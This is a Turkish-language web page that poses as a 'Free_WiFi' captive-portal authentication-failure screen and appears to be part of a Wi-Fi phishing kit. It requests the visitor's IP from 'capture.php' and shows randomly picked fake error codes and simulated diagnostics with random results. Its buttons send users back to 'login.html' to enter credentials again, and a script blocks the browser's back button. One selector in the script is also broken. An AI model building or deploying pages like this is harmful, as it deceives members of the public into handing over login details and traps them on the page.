<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bağlantı Hatası - Wi-Fi Erişimi</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,">
    
    <!-- Security Headers -->
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <!-- Mobile Optimization -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
</head>
<body>
    <div class="container">
        <div class="header" style="background: linear-gradient(135deg, #dc3545, #c82333);">
            <div class="wifi-icon">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 9L12 20L23 9C18.5 4.5 5.5 4.5 1 9Z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" opacity="0.3"/>
                    <path d="M5 13L12 20L19 13C16.5 10.5 7.5 10.5 5 13Z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" opacity="0.5"/>
                    <path d="M9 17L12 20L15 17C13.5 15.5 10.5 15.5 9 17Z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" opacity="0.7"/>
                    <line x1="18" y1="6" x2="6" y2="18" stroke="#fff" stroke-width="3" stroke-linecap="round"/>
                    <line x1="6" y1="6" x2="18" y2="18" stroke="#fff" stroke-width="3" stroke-linecap="round"/>
                </svg>
            </div>
            <h1>⚠️ Bağlantı Hatası</h1>
            <p>Wi-Fi ağına bağlanırken bir sorun oluştu</p>
        </div>

        <div class="content">
            <div class="error-message">
                <div class="error-icon">
                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10" stroke="#dc3545" stroke-width="2"/>
                        <line x1="15" y1="9" x2="9" y2="15" stroke="#dc3545" stroke-width="2" stroke-linecap="round"/>
                        <line x1="9" y1="9" x2="15" y2="15" stroke="#dc3545" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </div>
                
                <h2>Bağlantı Kurulamadı</h2>
                <p class="error-description">
                    Kimlik doğrulama işlemi sırasında bir hata oluştu. 
                    Lütfen bilgilerinizi kontrol ederek tekrar deneyin.
                </p>
            </div>

            <div class="error-details">
                <h3>🔍 Olası Nedenler</h3>
                <div class="error-reasons">
                    <div class="reason-item">
                        <span class="reason-icon">🔑</span>
                        <div class="reason-content">
                            <h4>Yanlış Kimlik Bilgileri</h4>
                            <p>Kullanıcı adı veya şifre hatalı olabilir</p>
                        </div>
                    </div>
                    
                    <div class="reason-item">
                        <span class="reason-icon">📶</span>
                        <div class="reason-content">
                            <h4>Zayıf Sinyal</h4>
                            <p>Wi-Fi sinyali çok zayıf veya kesintili</p>
                        </div>
                    </div>
                    
                    <div class="reason-item">
                        <span class="reason-icon">🚫</span>
                        <div class="reason-content">
                            <h4>Ağ Kapasitesi</h4>
                            <p>Ağ kapasitesi dolu, daha sonra deneyin</p>
                        </div>
                    </div>
                    
                    <div class="reason-item">
                        <span class="reason-icon">⚙️</span>
                        <div class="reason-content">
                            <h4>Teknik Sorun</h4>
                            <p>Sunucu veya ağ altyapısında geçici sorun</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="solution-steps">
                <h3>🛠️ Çözüm Adımları</h3>
                <div class="steps-container">
                    <div class="step-item">
                        <div class="step-number">1</div>
                        <div class="step-content">
                            <h4>Bilgileri Kontrol Edin</h4>
                            <p>Kullanıcı adı, e-posta ve şifre bilgilerinizi doğru girdiğinizden emin olun.</p>
                        </div>
                    </div>
                    
                    <div class="step-item">
                        <div class="step-number">2</div>
                        <div class="step-content">
                            <h4>Konumu Değiştirin</h4>
                            <p>Daha güçlü sinyal almak için modem/router yakınına geçin.</p>
                        </div>
                    </div>
                    
                    <div class="step-item">
                        <div class="step-number">3</div>
                        <div class="step-content">
                            <h4>Bağlantıyı Yenileyin</h4>
                            <p>Wi-Fi bağlantısını kapatıp açın veya cihazınızı yeniden başlatın.</p>
                        </div>
                    </div>
                    
                    <div class="step-item">
                        <div class="step-number">4</div>
                        <div class="step-content">
                            <h4>Tekrar Deneyin</h4>
                            <p>Birkaç dakika bekledikten sonra giriş işlemini tekrar deneyin.</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="action-buttons">
                <button class="btn btn-primary" onclick="retryConnection()">
                    <span class="btn-icon">🔄</span>
                    <span class="btn-text">Tekrar Dene</span>
                    <div class="loading-spinner" style="display: none;"></div>
                </button>
                
                <button class="btn btn-secondary" onclick="goToLogin()">
                    <span class="btn-icon">🔐</span>
                    Giriş Sayfasına Dön
                </button>
                
                <button class="btn btn-secondary" onclick="showDiagnostics()">
                    <span class="btn-icon">🔧</span>
                    Tanılama Yap
                </button>
            </div>

            <div class="diagnostics-section" id="diagnostics" style="display: none;">
                <h3>🔍 Bağlantı Tanılaması</h3>
                <div class="diagnostic-tests">
                    <div class="test-item">
                        <span class="test-label">Wi-Fi Bağlantısı:</span>
                        <span class="test-result" id="wifi-test">Test ediliyor...</span>
                        <span class="test-status" id="wifi-status">⏳</span>
                    </div>
                    
                    <div class="test-item">
                        <span class="test-label">İnternet Erişimi:</span>
                        <span class="test-result" id="internet-test">Test ediliyor...</span>
                        <span class="test-status" id="internet-status">⏳</span>
                    </div>
                    
                    <div class="test-item">
                        <span class="test-label">DNS Çözümleme:</span>
                        <span class="test-result" id="dns-test">Test ediliyor...</span>
                        <span class="test-status" id="dns-status">⏳</span>
                    </div>
                    
                    <div class="test-item">
                        <span class="test-label">Sunucu Bağlantısı:</span>
                        <span class="test-result" id="server-test">Test ediliyor...</span>
                        <span class="test-status" id="server-status">⏳</span>
                    </div>
                </div>
                
                <div class="diagnostic-results" id="diagnostic-results" style="display: none;">
                    <h4>📊 Tanılama Sonuçları</h4>
                    <div id="diagnostic-summary"></div>
                </div>
            </div>

            <div class="alternative-options">
                <h3>🔄 Alternatif Seçenekler</h3>
                <div class="options-grid">
                    <div class="option-item">
                        <div class="option-icon">👤</div>
                        <div class="option-content">
                            <h4>Misafir Erişimi</h4>
                            <p>Hesap oluşturmadan misafir olarak bağlanın</p>
                            <button class="btn btn-secondary btn-sm" onclick="guestAccess()">
                                Misafir Girişi
                            </button>
                        </div>
                    </div>
                    
                    <div class="option-item">
                        <div class="option-icon">📱</div>
                        <div class="option-content">
                            <h4>Mobil Hotspot</h4>
                            <p>Mobil cihazınızın internet bağlantısını kullanın</p>
                            <button class="btn btn-secondary btn-sm" onclick="showHotspotGuide()">
                                Rehber Göster
                            </button>
                        </div>
                    </div>
                    
                    <div class="option-item">
                        <div class="option-icon">🔌</div>
                        <div class="option-content">
                            <h4>Kablolu Bağlantı</h4>
                            <p>Ethernet kablosu ile doğrudan bağlanın</p>
                            <button class="btn btn-secondary btn-sm" onclick="showEthernetGuide()">
                                Nasıl Yapılır?
                            </button>
                        </div>
                    </div>
                    
                    <div class="option-item">
                        <div class="option-icon">📞</div>
                        <div class="option-content">
                            <h4>Teknik Destek</h4>
                            <p>Uzman desteği alın</p>
                            <button class="btn btn-secondary btn-sm" onclick="contactSupport()">
                                İletişime Geç
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="error-code-section">
                <h3>🏷️ Hata Detayları</h3>
                <div class="error-code-box">
                    <div class="error-code-item">
                        <span class="error-label">Hata Kodu:</span>
                        <span class="error-value" id="error-code">AUTH_FAILED_001</span>
                    </div>
                    
                    <div class="error-code-item">
                        <span class="error-label">Zaman:</span>
                        <span class="error-value" id="error-time">--</span>
                    </div>
                    
                    <div class="error-code-item">
                        <span class="error-label">IP Adresi:</span>
                        <span class="error-value" id="user-ip">--</span>
                    </div>
                    
                    <div class="error-code-item">
                        <span class="error-label">Ağ:</span>
                        <span class="error-value" id="network-name">Free_WiFi</span>
                    </div>
                </div>
                
                <p class="error-note">
                    Bu bilgileri teknik destek ile paylaşarak daha hızlı çözüm alabilirsiniz.
                </p>
            </div>
        </div>

        <div class="footer">
            <div class="footer-content">
                <div class="footer-section">
                    <h4>🆘 Acil Durum</h4>
                    <p>Kritik bağlantı sorunları için:</p>
                    <p><strong>Telefon:</strong> 0850 XXX XX XX</p>
                </div>
                
                <div class="footer-section">
                    <h4>📚 Yardım Kaynakları</h4>
                    <ul>
                        <li><a href="#" onclick="showFAQ()">Sık Sorulan Sorular</a></li>
                        <li><a href="#" onclick="showTroubleshooting()">Sorun Giderme</a></li>
                        <li><a href="#" onclick="showSystemRequirements()">Sistem Gereksinimleri</a></li>
                    </ul>
                </div>
                
                <div class="footer-section">
                    <h4>⏰ Destek Saatleri</h4>
                    <p>Pazartesi - Cuma: 09:00 - 18:00</p>
                    <p>Hafta sonu: 10:00 - 16:00</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal for additional information -->
    <div id="modal-overlay" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">Bilgi</h3>
                <span class="modal-close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body">
                <!-- Modal content will be inserted here -->
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal()">Kapat</button>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script>
        // Page initialization
        document.addEventListener('DOMContentLoaded', function() {
            // Set error time
            document.getElementById('error-time').textContent = new Date().toLocaleString('tr-TR');
            
            // Get user IP
            getUserIP();
            
            // Get network name from URL
            const urlParams = new URLSearchParams(window.location.search);
            const ssid = urlParams.get('ssid') || 'Free_WiFi';
            document.getElementById('network-name').textContent = ssid;
            
            // Generate random error code
            generateErrorCode();
        });

        // Get user's IP address
        function getUserIP() {
            fetch('capture.php?action=get_ip')
                .then(response => response.text())
                .then(ip => {
                    document.getElementById('user-ip').textContent = ip;
                })
                .catch(() => {
                    document.getElementById('user-ip').textContent = 'Alınamadı';
                });
        }

        // Generate error code
        function generateErrorCode() {
            const codes = [
                'AUTH_FAILED_001',
                'NETWORK_TIMEOUT_002',
                'INVALID_CREDENTIALS_003',
                'SERVER_ERROR_004',
                'CONNECTION_REFUSED_005',
                'DNS_RESOLUTION_006'
            ];
            
            const randomCode = codes[Math.floor(Math.random() * codes.length)];
            document.getElementById('error-code').textContent = randomCode;
        }

        // Retry connection
        function retryConnection() {
            const button = event.target.closest('.btn');
            const btnText = button.querySelector('.btn-text');
            const spinner = button.querySelector('.loading-spinner');
            
            btnText.style.display = 'none';
            spinner.style.display = 'inline-block';
            button.disabled = true;
            
            // Simulate retry process
            setTimeout(() => {
                // Redirect to login page
                window.location.href = 'login.html';
            }, 2000);
        }

        // Go to login page
        function goToLogin() {
            window.location.href = 'login.html';
        }

        // Show diagnostics
        function showDiagnostics() {
            const diagnosticsSection = document.getElementById('diagnostics');
            diagnosticsSection.style.display = 'block';
            
            // Run diagnostic tests
            runDiagnosticTests();
        }

        // Run diagnostic tests
        function runDiagnosticTests() {
            const tests = [
                { id: 'wifi', name: 'Wi-Fi Bağlantısı', delay: 1000 },
                { id: 'internet', name: 'İnternet Erişimi', delay: 2000 },
                { id: 'dns', name: 'DNS Çözümleme', delay: 3000 },
                { id: 'server', name: 'Sunucu Bağlantısı', delay: 4000 }
            ];
            
            tests.forEach(test => {
                setTimeout(() => {
                    const result = Math.random() > 0.3; // 70% success rate
                    const resultElement = document.getElementById(test.id + '-test');
                    const statusElement = document.getElementById(test.id + '-status');
                    
                    if (result) {
                        resultElement.textContent = 'Başarılı';
                        resultElement.style.color = '#28a745';
                        statusElement.textContent = '✅';
                    } else {
                        resultElement.textContent = 'Başarısız';
                        resultElement.style.color = '#dc3545';
                        statusElement.textContent = '❌';
                    }
                }, test.delay);
            });
            
            // Show results after all tests
            setTimeout(() => {
                showDiagnosticResults();
            }, 5000);
        }

        // Show diagnostic results
        function showDiagnosticResults() {
            const resultsSection = document.getElementById('diagnostic-results');
            const summaryElement = document.getElementById('diagnostic-summary');
            
            const successCount = document.querySelectorAll('.test-status').length - document.querySelectorAll('.test-status:contains("❌")').length;
            
            let summary = '';
            if (successCount >= 3) {
                summary = '<p style="color: #28a745;">✅ Çoğu test başarılı. Bağlantı sorunu geçici olabilir.</p>';
            } else if (successCount >= 2) {
                summary = '<p style="color: #ffc107;">⚠️ Bazı testler başarısız. Ağ ayarlarını kontrol edin.</p>';
            } else {
                summary = '<p style="color: #dc3545;">❌ Çoklu sorun tespit edildi. Teknik destek gerekli.</p>';
            }
            
            summaryElement.innerHTML = summary;
            resultsSection.style.display = 'block';
        }

        // Guest access
        function guestAccess() {
            window.location.href = 'login.html?type=guest';
        }

        // Show hotspot guide
        function showHotspotGuide() {
            showModal('Mobil Hotspot Rehberi', `
                <h4>📱 Mobil Hotspot Nasıl Açılır?</h4>
                
                <div class="guide-section">
                    <h5>Android Cihazlar:</h5>
                    <ol>
                        <li>Ayarlar > Bağlantılar > Mobil Hotspot ve Tethering</li>
                        <li>"Mobil Hotspot" seçeneğini açın</li>
                        <li>Ağ adı ve şifre belirleyin</li>
                        <li>Diğer cihazlardan bu ağa bağlanın</li>
                    </ol>
                </div>
                
                <div class="guide-section">
                    <h5>iPhone Cihazlar:</h5>
                    <ol>
                        <li>Ayarlar > Kişisel Hotspot</li>
                        <li>"Kişisel Hotspot" seçeneğini açın</li>
                        <li>Wi-Fi şifresini ayarlayın</li>
                        <li>Diğer cihazlardan bağlanın</li>
                    </ol>
                </div>
                
                <p><strong>⚠️ Uyarı:</strong> Mobil hotspot kullanımı veri kotanızı tüketir.</p>
            `);
        }

        // Show ethernet guide
        function showEthernetGuide() {
            showModal('Kablolu Bağlantı Rehberi', `
                <h4>🔌 Ethernet Bağlantısı</h4>
                
                <div class="guide-section">
                    <h5>Gerekli Malzemeler:</h5>
                    <ul>
                        <li>Ethernet kablosu (RJ45)</li>
                        <li>Ethernet portuna sahip cihaz</li>
                        <li>Aktif internet bağlantısı olan modem/router</li>
                    </ul>
                </div>
                
                <div class="guide-section">
                    <h5>Bağlantı Adımları:</h5>
                    <ol>
                        <li>Ethernet kablosunu cihazınıza takın</li>
                        <li>Kablonun diğer ucunu modem/router'a bağlayın</li>
                        <li>Cihazınızda ağ ayarlarını kontrol edin</li>
                        <li>Otomatik IP alımını etkinleştirin</li>
                    </ol>
                </div>
                
                <p><strong>💡 İpucu:</strong> Kablolu bağlantı genellikle Wi-Fi'dan daha hızlı ve kararlıdır.</p>
            `);
        }

        // Contact support
        function contactSupport() {
            showModal('Teknik Destek', `
                <h4>📞 İletişim Bilgileri</h4>
                
                <div class="contact-info">
                    <div class="contact-item">
                        <strong>📞 Telefon:</strong> 0850 XXX XX XX
                    </div>
                    <div class="contact-item">
                        <strong>📧 E-posta:</strong> destek@freewifi.com
                    </div>
                    <div class="contact-item">
                        <strong>💬 Canlı Destek:</strong> 7/24 aktif
                    </div>
                    <div class="contact-item">
                        <strong>🕒 Çalışma Saatleri:</strong> 09:00 - 18:00
                    </div>
                </div>
                
                <h4>📋 Destek Talebinde Belirtilecek Bilgiler</h4>
                <ul>
                    <li>Hata kodu: <strong>${document.getElementById('error-code').textContent}</strong></li>
                    <li>Hata zamanı: <strong>${document.getElementById('error-time').textContent}</strong></li>
                    <li>IP adresi: <strong>${document.getElementById('user-ip').textContent}</strong></li>
                    <li>Cihaz türü ve işletim sistemi</li>
                    <li>Sorunun detaylı açıklaması</li>
                </ul>
            `);
        }

        // Show FAQ
        function showFAQ() {
            showModal('Sık Sorulan Sorular', `
                <div class="faq-item">
                    <h5>❓ Şifremi unuttum, ne yapmalıyım?</h5>
                    <p>Şifre sıfırlama linkini kullanarak yeni şifre oluşturabilirsiniz.</p>
                </div>
                
                <div class="faq-item">
                    <h5>❓ Neden sürekli bağlantım kopuyor?</h5>
                    <p>Sinyal gücünü kontrol edin ve cihazınızı yeniden başlatmayı deneyin.</p>
                </div>
                
                <div class="faq-item">
                    <h5>❓ Hangi cihazlar destekleniyor?</h5>
                    <p>Tüm Wi-Fi özellikli cihazlar (telefon, tablet, laptop, PC) desteklenir.</p>
                </div>
                
                <div class="faq-item">
                    <h5>❓ Aynı anda kaç cihaz bağlanabilir?</h5>
                    <p>Hesap başına maksimum 5 cihaz aynı anda bağlanabilir.</p>
                </div>
            `);
        }

        // Show troubleshooting
        function showTroubleshooting() {
            showModal('Sorun Giderme', `
                <h4>🔧 Yaygın Sorunlar ve Çözümleri</h4>
                
                <div class="troubleshoot-item">
                    <h5>🚫 "Kimlik doğrulama hatası"</h5>
                    <ul>
                        <li>Kullanıcı adı ve şifreyi kontrol edin</li>
                        <li>Caps Lock tuşunun kapalı olduğundan emin olun</li>
                        <li>Şifre sıfırlama seçeneğini deneyin</li>
                    </ul>
                </div>
                
                <div class="troubleshoot-item">
                    <h5>📶 "Zayıf sinyal"</h5>
                    <ul>
                        <li>Modem/router yakınına geçin</li>
                        <li>Engelleri (duvar, metal objeler) kaldırın</li>
                        <li>5GHz yerine 2.4GHz bandını deneyin</li>
                    </ul>
                </div>
                
                <div class="troubleshoot-item">
                    <h5>🌐 "İnternet yok"</h5>
                    <ul>
                        <li>DNS ayarlarını değiştirin (8.8.8.8)</li>
                        <li>Tarayıcı önbelleğini temizleyin</li>
                        <li>Proxy ayarlarını kontrol edin</li>
                    </ul>
                </div>
            `);
        }

        // Show system requirements
        function showSystemRequirements() {
            showModal('Sistem Gereksinimleri', `
                <h4>💻 Minimum Sistem Gereksinimleri</h4>
                
                <div class="req-section">
                    <h5>📱 Mobil Cihazlar:</h5>
                    <ul>
                        <li>Android 5.0+ veya iOS 10+</li>
                        <li>Wi-Fi 802.11b/g/n/ac desteği</li>
                        <li>Güncel web tarayıcısı</li>
                    </ul>
                </div>
                
                <div class="req-section">
                    <h5>💻 Bilgisayarlar:</h5>
                    <ul>
                        <li>Windows 7+ / macOS 10.10+ / Linux</li>
                        <li>Wi-Fi adaptörü</li>
                        <li>Chrome 60+, Firefox 55+, Safari 10+, Edge 40+</li>
                    </ul>
                </div>
                
                <div class="req-section">
                    <h5>🌐 Ağ Gereksinimleri:</h5>
                    <ul>
                        <li>WPA/WPA2 güvenlik protokolü desteği</li>
                        <li>DHCP istemci desteği</li>
                        <li>JavaScript etkin tarayıcı</li>
                    </ul>
                </div>
            `);
        }

        // Generic modal function
        function showModal(title, content) {
            document.getElementById('modal-title').textContent = title;
            document.getElementById('modal-body').innerHTML = content;
            document.getElementById('modal-overlay').style.display = 'flex';
        }

        // Close modal
        function closeModal() {
            document.getElementById('modal-overlay').style.display = 'none';
        }

        // Prevent back button
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
    </script>
</body>
</html>